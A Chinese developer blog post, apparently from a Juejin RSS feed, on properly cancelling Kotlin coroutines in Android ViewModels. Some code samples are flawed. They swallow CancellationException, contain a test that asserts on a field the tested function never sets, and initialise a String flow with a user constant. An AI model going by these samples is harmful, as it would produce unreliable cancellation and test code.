</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何正确取消 ViewModel 里的协程]]></title>    <link>https://juejin.cn/post/7602488187407614004</link>    <guid>https://juejin.cn/post/7602488187407614004</guid>    <pubDate>2026-02-04T00:29:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602488187407614004" data-draft-id="7600225000851111971" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何正确取消 ViewModel 里的协程"/> <meta itemprop="keywords" content="Kotlin,Android"/> <meta itemprop="datePublished" content="2026-02-04T00:29:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何正确取消 ViewModel 里的协程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:29:49.000Z" title="Wed Feb 04 2026 00:29:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{font-family:-apple-system,BlinkMacSystemFont,PingFang SC,Helvetica Neue,Helvetica,Arial,sans-serif;word-break:break-word;line-height:1.75;font-weight:200;font-size:16px;overflow-x:hidden;color:#666;letter-spacing:.5px}.markdown-body a{text-decoration:none;color:#0064c8;position:relative}.markdown-body a:after{content:"";position:absolute;bottom:-2px;left:0;width:100%;height:1px;background-color:rgba(0,100,200,.7);transform:scale(0);transition:all .4s ease-in-out}.markdown-body a:link:hover:after{transform:scale(1)}.markdown-body code{padding:2px 4px;font-size:.9em;font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px;background-color:rgba(0,46,70,.0431);color:#39f}.markdown-body strong{font-weight:400}.markdown-body em{color:#ff6a00}.markdown-body del,.markdown-body s{color:#bbb}.markdown-body small{font-size:.8em;color:#bbb}.markdown-body kbd{margin:0 .1em;padding:5px 8px 3px;border:1px solid #d1d5d9;border-radius:3px;box-shadow:0 1px 0 0 #e3e4e6,inset 0 0 0 2px #fff;background-color:#eee;font-weight:600;font-size:.8em;font-family:Arial,Helvetica Neue,Helvetica,sans-serif;white-space:nowrap;color:#666}.markdown-body kbd:first-child{margin-left:0}.markdown-body kbd:last-child{margin-right:0}.markdown-body img{display:block;border:0;max-width:calc(100% - 20px);min-width:20px;min-height:20px;margin:0 10px;box-shadow:0 2px 8px 2px rgba(0,0,0,.2);transition:all .25s ease-in-out}.markdown-body img:hover{transform:translateY(-4px)}.markdown-body blockquote,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{line-height:inherit;font-size:inherit;color:inherit}.markdown-body blockquote:first-child,.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child,.markdown-body ol:first-child,.markdown-body p:first-child,.markdown-body pre:first-child,.markdown-body table:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body blockquote:last-child,.markdown-body h1:last-child,.markdown-body h2:last-child,.markdown-body h3:last-child,.markdown-body h4:last-child,.markdown-body h5:last-child,.markdown-body h6:last-child,.markdown-body ol:last-child,.markdown-body p:last-child,.markdown-body pre:last-child,.markdown-body table:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:1.6em 0 .6em;color:#333;font-weight:400;position:relative}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{position:absolute;left:-2em}.markdown-body h1{font-size:1.75em}.markdown-body h1:before{content:"#"}.markdown-body h1:first-child{margin-top:0}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.35em}.markdown-body h4{font-size:1.2em}.markdown-body h5{font-size:1.1em}.markdown-body h6{font-size:1em}.markdown-body blockquote,.markdown-body ol,.markdown-body pre,.markdown-body table,.markdown-body ul{margin:1em 0}.markdown-body p{margin:.7em 0;word-break:break-word}.markdown-body pre{padding:8px 12px;color:#666;background-color:rgba(0,46,70,.0431);border:1px solid #ebebeb;tab-size:4;white-space:pre-wrap;line-height:1.4}.markdown-body pre code{color:inherit;background-color:transparent;padding:0}.markdown-body ol,.markdown-body ul{margin:1em 0 1em 2em;padding:0;line-height:1.5!important;font-size:inherit;color:inherit}.markdown-body ol:first-child,.markdown-body ul:first-child{margin-top:0}.markdown-body ol:last-child,.markdown-body ul:last-child{margin-bottom:0}.markdown-body ol li,.markdown-body ul li{margin:.5em 0;list-style:inherit}.markdown-body ul{list-style:disc outside}.markdown-body ul ul{list-style-type:circle}.markdown-body ul ul ul{list-style-type:square}.markdown-body ol{list-style:decimal outside}.markdown-body ol ol{list-style-type:lower-alpha}.markdown-body ol ol ol{list-style-type:lower-roman}.markdown-body blockquote{font-size:.9em;padding:8px 20px 8px 15px;color:#666;border-left:5px solid rgba(0,100,200,.7);background-color:rgba(0,100,200,.1)}.markdown-body table{border-collapse:collapse;border-spacing:0;max-width:100%;min-width:50%;word-wrap:break-word;color:inherit}.markdown-body table thead tr{background-color:#f4f6f7}.markdown-body table td,.markdown-body table th{padding:4px 16px;font-size:.95em;text-align:left;color:inherit;border:0;min-width:72px}.markdown-body table td[align=center],.markdown-body table th[align=center]{text-align:center}.markdown-body table td[align=right],.markdown-body table th[align=right]{text-align:right}.markdown-body table th{border-bottom:2px solid #e3e4e6;color:#333;font-weight:400;white-space:nowrap}.markdown-body table td{border-bottom:1px solid #ebebeb}.markdown-body hr{margin:1.5em 0;padding:0;border:0;background:linear-gradient(90deg,rgba(0,46,70,.0431),#ebebeb 50%,rgba(0,46,70,.0431));height:1px}.markdown-body br{content:"";display:block}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9c242af436549feb356a83a5d210f54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769789&amp;x-signature=B%2B3HYeFBUGjLyg%2F2%2FyV7t5iLOLU%3D" alt="0.png" loading="lazy"/></p>
<p>昨天，我写过这样<a href="https://juejin.cn/post/7602072652607602728" target="_blank" title="https://juejin.cn/post/7602072652607602728">一篇文章</a>，里面讲述了一个可能 90% 的开发者都答不上来问题。</p>
<p>中午我和同事吃饭的时候，他问我：然后呢，你就水一篇文章不给解决方案？你知道程序员流行一句什么样的话吗？——留图不留种，xx万人x。</p>
<p>OK，打住！</p>
<p>这里，我们从 <code>viewModelScope</code> 入手，看看这个取消的问题！</p>
<h2 data-id="heading-0">viewModelScope</h2>
<p>我知道，作为一名安卓开发者，都曾花费无数时间调试各种诡异的崩溃问题和内存泄漏，而这些问题的根源往往都指向协程处理不当。</p>
<p>如果使用 <code>Kotlin</code> 协程，大概率对 <code>viewModelScope</code> 并不陌生。</p>
<p>它是将协程与 <code>ViewModel</code> 生命周期绑定的绝佳工具，但如果取消操作处理不当，麻烦便会接踵而至。</p>
<p>泄漏的协程会持续占用资源、浪费 <code>CPU</code> 算力，更糟的是，还可能导致应用行为异常。</p>
<p>在本文中，我将分享自己摸索出的 <code>viewModelScope</code> 取消操作实战经验，结合具体示例和技巧，避免被“xx万人x”。</p>
<h2 data-id="heading-1">为何取消操作至关重要</h2>
<p><code>viewModelScope</code> 是与 <code>ViewModel</code> 生命周期绑定的协程作用域。</p>
<p>当 <code>ViewModel</code> 被销毁时（比如关联的 <code>Activity</code> 或 <code>Fragment</code> 销毁），该作用域会自动取消所有关联的协程。</p>
<p>听起来很完美？</p>
<p>但关键问题在于：自动取消不代表可以高枕无忧。稍不注意，协程仍可能超时运行、占用资源，或触发未捕获异常导致应用崩溃。</p>
<p><em>还记得之前的文章的那句话吗？协程的取消是协作的。</em></p>
<p>规范的取消操作能确保应用始终轻量、行为可预测，尤其是在配置变更或进程终止的场景下。</p>
<p>接下来，我们聊聊如何专业地管理 <code>viewModelScope</code> 的取消逻辑。</p>
<h2 data-id="heading-2">理解 viewModelScope</h2>
<p><code>viewModelScope</code> 是 <code>androidx.lifecycle:lifecycle-viewmodel-ktx</code> 库提供的属性，本质是绑定到 <code>Dispatchers.Main</code> 主线程、且与 <code>ViewModel</code> 生命周期关联的 <code>CoroutineScope</code>。</p>
<p>当 <code>ViewModel</code> 的 <code>onCleared()</code> 方法被调用时，该作用域会取消所有协程。</p>
<p>这对 <code>Android</code> 开发而言堪称绝配——毕竟 <code>UI</code> 组件的生命周期本就多变，但这一切的前提是，你编写的代码要具备“取消感知”能力。</p>
<p>以下是使用 <code>viewModelScope</code> 的简单 <code>ViewModel</code> 示例：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchData</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span> = fetchDataFromNetwork() <span class="hljs-comment">// 挂起函数</span>
            <span class="hljs-comment">// 更新UI</span>
        }
    }
}
</code></pre>
<p>当 <code>ViewModel</code> 被销毁（比如用户跳转页面），协程会被取消。</p>
<p>但如果 <code>fetchDataFromNetwork()</code> 是耗时操作，情况会如何？</p>
<h2 data-id="heading-3">取消操作不当的常见陷阱</h2>
<p>在我早期的项目中，我曾以为 <code>viewModelScope</code> 能“魔法般”处理所有问题，实际上根本不可能。</p>
<p>以下是我踩过的典型坑：</p>
<ol>
<li><strong>不可取消的操作</strong>：部分挂起函数（如第三方库调用）不响应取消指令，导致资源持续占用。或者，你调用的函数就是一个普通函数，根本不是挂起函数，不可能响应取消指令；</li>
<li><strong>资源泄漏</strong>：若协程持有 <code>Context</code> 或 <code>View</code> 的引用，即便取消协程也无法释放资源，最终引发内存泄漏；</li>
<li><strong>未捕获异常</strong>：协程取消过程中若抛出未处理的 <code>CancellationException</code>，可能直接导致应用崩溃。</li>
</ol>
<h2 data-id="heading-4">题外话</h2>
<p>其实早期对于线程我也是这么理解的，我们翻看一下现在的 Java 线程的源码：</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-meta">@Deprecated(
    since = "1.2",
    forRemoval = true
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">interrupt</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span> != currentThread()) {
        <span class="hljs-built_in">this</span>.checkAccess();
    }

    <span class="hljs-built_in">this</span>.interrupted = <span class="hljs-literal">true</span>;
    <span class="hljs-built_in">this</span>.interrupt0();
    <span class="hljs-comment">//...</span>
}
</code></pre>
<p><code>stop</code> 已经是一个弃用且不可用的接口了。</p>
<p>刚学 Java 的我一直以为，如果我调用 <code>stop</code> 或者 <code>interrupt</code>，Java 一定会完美的帮我取消线程，释放资源。但实际上我们需要写额外的代码来达成这一步，例如判断 <code>interrupted</code> 标志位。</p>
<p>题外话结束，接下来，我们看看如何解决取消操作不当的问题。</p>
<h2 data-id="heading-5">编写支持取消的挂起函数</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4074f668c159463a8e31aeae9a229d66~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769789&amp;x-signature=CKTSF1VeJh4qxqWnP4AA7W0FRyg%3D" alt="1.png" loading="lazy"/></p>
<p><strong>并非所有挂起函数都天生支持取消</strong>。</p>
<p>如果调用的是非挂起的阻塞式 <code>API</code>（如遗留库），需通过包装让其响应取消指令，可使用 <code>isActive</code> 或 <code>yield()</code> 检查取消状态。</p>
<p>以下是支持取消的挂起函数示例：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchDataFromNetwork</span><span class="hljs-params">()</span></span>: String = withContext(Dispatchers.IO) {
    <span class="hljs-comment">// 模拟耗时网络请求</span>
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.10</span>) {
        <span class="hljs-keyword">if</span> (!isActive) <span class="hljs-keyword">return</span><span class="hljs-symbol">@withContext</span> <span class="hljs-string">"已取消"</span> <span class="hljs-comment">// 取消则退出</span>
        delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// 模拟网络延迟</span>
    }
    <span class="hljs-string">"数据获取成功"</span>
}
</code></pre>
<p>该函数中，<code>isActive</code> 会检查协程是否仍处于活跃状态。当 <code>ViewModel</code> 被销毁时，<code>isActive</code> 变为 <code>false</code>，函数会提前退出。</p>
<h2 data-id="heading-6">遵循结构化并发原则</h2>
<p><strong>结构化并发能确保子协程随父作用域取消而取消</strong>。</p>
<p><code>viewModelScope</code> 本身已遵循这一原则，但启动嵌套协程时仍需刻意注意：避免使用 <code>GlobalScope</code>，因其不绑定任何生命周期，通常比 <code>ViewModel</code> 存活更久。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _data = MutableLiveData&lt;String&gt;()
    <span class="hljs-keyword">val</span> <span class="hljs-keyword">data</span>: LiveData&lt;String&gt; = _data

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchMultipleData</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">val</span> result1 = async { fetchDataFromNetwork() }.await()
                <span class="hljs-keyword">val</span> result2 = async { fetchDataFromNetwork() }.await()
                _data.value = <span class="hljs-string">"<span class="hljs-variable">$result1</span>, <span class="hljs-variable">$result2</span>"</span>
            } <span class="hljs-keyword">catch</span> (e: CancellationException) {
                _data.value = <span class="hljs-string">"操作已取消"</span>
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                _data.value = <span class="hljs-string">"错误：<span class="hljs-subst">${e.message}</span>"</span>
            }
        }
    }
}
</code></pre>
<p>此处的 <code>async</code> 协程是 <code>viewModelScope.launch</code> 代码块的子协程，当 <code>ViewModel</code> 被销毁时，所有子协程会自动取消。</p>
<p><em>针对 <code>CancellationException</code> 的正确做法应该是重新抛出，不过这里只是为了展示当前函数的取消逻辑，所以并没有这么做，文章的后续部分将依然采用这种做法，但是亲爱的读者们，你们要知道这个地方这么做是有待商榷的。</em></p>
<h2 data-id="heading-7">处理取消异常</h2>
<p>协程取消时会抛出 <code>CancellationException</code>，这是正常行为，但必须妥善处理以避免意外崩溃。建议始终将协程代码包裹在 <code>try-catch</code> 块中。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _status = MutableLiveData&lt;String&gt;()
    <span class="hljs-keyword">val</span> status: LiveData&lt;String&gt; = _status

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">performLongRunningTask</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">try</span> {
                _status.value = withContext(Dispatchers.IO) {
                    <span class="hljs-comment">// 耗时任务</span>
                    delay(<span class="hljs-number">5000</span>)
                    <span class="hljs-string">"任务完成"</span>
                }
            } <span class="hljs-keyword">catch</span> (e: CancellationException) {
                _status.value = <span class="hljs-string">"任务已取消"</span>
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                _status.value = <span class="hljs-string">"错误：<span class="hljs-subst">${e.message}</span>"</span>
            }
        }
    }
}
</code></pre>
<p>这能确保 <code>ViewModel</code> 销毁时，应用优雅处理取消操作，并同步更新 <code>UI</code> 状态。</p>
<h2 data-id="heading-8">避免持有 UI 组件引用</h2>
<p><code>viewModelScope</code> 中的协程若不慎持有 <code>Activity</code> 或 <code>Fragment</code> 的引用，极易引发内存泄漏。</p>
<p>比如向挂起函数传递 <code>Context</code>，可能导致<code>Activity</code> 在取消后仍无法释放。建议改用依赖注入，或显式传递数据。</p>
<p>❌ 错误示例：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">badFetch</span><span class="hljs-params">(activity: <span class="hljs-type">Activity</span>)</span></span> {
        viewModelScope.launch {
            <span class="hljs-comment">// 持有Activity引用易导致泄漏</span>
            activity.showToast(fetchDataFromNetwork())
        }
    }
}
</code></pre>
<p>✅ 优化方案：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyViewModel</span> : <span class="hljs-type">ViewModel</span>() {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _toastMessage = MutableStateFlow&lt;String&gt;(<span class="hljs-string">""</span>)
    <span class="hljs-keyword">val</span> toastMessage: Flow&lt;String&gt; = _toastMessage

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchAndNotify</span><span class="hljs-params">()</span></span> {
        viewModelScope.launch {
            _toastMessage.value = fetchDataFromNetwork()
        }
    }
}
</code></pre>
<p>在 <code>Activity</code> 中观察 <code>toastMessage</code> 并显示弹窗，实现协程与 <code>UI</code> 解耦。</p>
<h2 data-id="heading-9">测试取消行为</h2>
<p>取消逻辑的测试虽有难度，但至关重要。可使用 <code>kotlinx-coroutines-test</code> 库的 <code>runBlockingTest</code> 模拟单元测试中的取消场景：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-meta">@Test</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> `fetchData cancels correctly`<span class="hljs-params">()</span></span> = runBlockingTest {
    <span class="hljs-keyword">val</span> viewModel = MyViewModel()
    <span class="hljs-keyword">val</span> job = viewModel.viewModelScope.launch {
        viewModel.fetchData()
    }
    job.cancel()
    assertEquals(<span class="hljs-string">"任务已取消"</span>, viewModel.status.value)
}
</code></pre>
<p>这能确保协程取消时能正确清理资源。</p>
<h2 data-id="heading-10">实战</h2>
<p>如果需求需要实现“获取用户数据 → 处理数据 → 更新 <code>UI</code>”的流程，同时要适配配置变更和潜在的取消操作，以下是一个典型的实现方案：</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserViewModel</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> apiService: ApiService) : ViewModel() {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _userData = MutableStateFlow&lt;User&gt;(DEF_USER)
    <span class="hljs-keyword">val</span> userData: Flow&lt;User&gt; = _userData
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> _error = MutableStateFlow&lt;String&gt;(DEF_USER)
    <span class="hljs-keyword">val</span> error: Flow&lt;String&gt; = _error

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">fetchUserProfile</span><span class="hljs-params">(userId: <span class="hljs-type">String</span>)</span></span> {
        viewModelScope.launch {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">val</span> user = withContext(Dispatchers.IO) {
                    ensureActive() <span class="hljs-comment">// 执行前检查取消状态</span>
                    <span class="hljs-keyword">val</span> rawData = apiService.getUser(userId)
                    processUserData(rawData) <span class="hljs-comment">// 耗时处理操作</span>
                }
                _userData.value = user
            } <span class="hljs-keyword">catch</span> (e: CancellationException) {
                _error.value = <span class="hljs-string">"用户数据获取已取消"</span>
            } <span class="hljs-keyword">catch</span> (e: Exception) {
                _error.value = <span class="hljs-string">"获取用户数据失败：<span class="hljs-subst">${e.message}</span>"</span>
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">processUserData</span><span class="hljs-params">(rawData: <span class="hljs-type">RawUserData</span>)</span></span>: User {
        <span class="hljs-keyword">return</span> withContext(Dispatchers.Default) {
            ensureActive() <span class="hljs-comment">// 处理过程中检查取消状态</span>
            <span class="hljs-comment">// 模拟复杂数据处理</span>
            delay(<span class="hljs-number">2000</span>)
            User(rawData.id, rawData.name)
        }
    }
}
</code></pre>
<p>核心要点：</p>
<ul>
<li><code>ensureActive()</code> 会在协程取消时抛出 <code>CancellationException</code>，让函数具备取消感知能力；</li>
<li><code>Dispatchers.IO</code> 和 <code>Dispatchers.Default</code> 确保耗时操作脱离主线程；</li>
<li>通过 <code>Flow</code> 传递错误和取消状态，保持 <code>UI</code> 同步。</li>
</ul>
<h2 data-id="heading-11">避坑指南</h2>
<ol>
<li><strong>忽略取消检查</strong>：耗时挂起函数中务必通过 <code>isActive</code> 或 <code>ensureActive()</code> 检查取消状态；</li>
<li><strong>滥用 GlobalScope</strong>：坚持使用 <code>viewModelScope</code>，确保协程与生命周期绑定。如果你的代码中出现了 <code>GlobalScope</code>，你的代码一定有问题；</li>
<li><strong>忘记处理异常</strong>：务必将 <code>CancellationException</code> 与其他异常分开捕获，更通用的做法就是重新抛出；</li>
<li><strong>阻塞主线程</strong>：非 <code>UI</code> 操作需通过 <code>withContext</code> 切换到合适的调度器。</li>
</ol>
<h2 data-id="heading-12">总结</h2>
<p>掌握 <code>viewModelScope</code> 取消操作的核心，在于理解生命周期、编写支持取消的代码，并优雅处理边界情况。</p>
<p>遵循这些最佳实践——编写协作式挂起函数、利用结构化并发、妥善处理异常、避免持有 <code>UI</code> 引用，你就能开发出健壮且高效的 <code>Android</code> 应用。</p>
<p>下次遇到莫名的内存泄漏或崩溃时，不妨检查一下协程：往往只需做好取消处理，就能解决问题。</p>
<p>我马上把这篇文章发给我的同事，免得后患无穷。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Xcode 26.3 炸裂更新：原生支持 AI Agent 编程]]></title>    <link>https://juejin.cn/post/7602471311509274651</link>    <guid>https://juejin.cn/post/7602471311509274651</guid>    <pubDate>2026-02-04T00:48:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602471311509274651" data-draft-id="7602512226998632498" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Xcode 26.3 炸裂更新：原生支持 AI Agent 编程"/> <meta itemprop="keywords" content="Xcode,iOS"/> <meta itemprop="datePublished" content="2026-02-04T00:48:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="黄林晴"/> <meta itemprop="url" content="https://juejin.cn/user/3985057546510423"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Xcode 26.3 炸裂更新：原生支持 AI Agent 编程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3985057546510423/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    黄林晴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T00:48:35.000Z" title="Wed Feb 04 2026 00:48:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
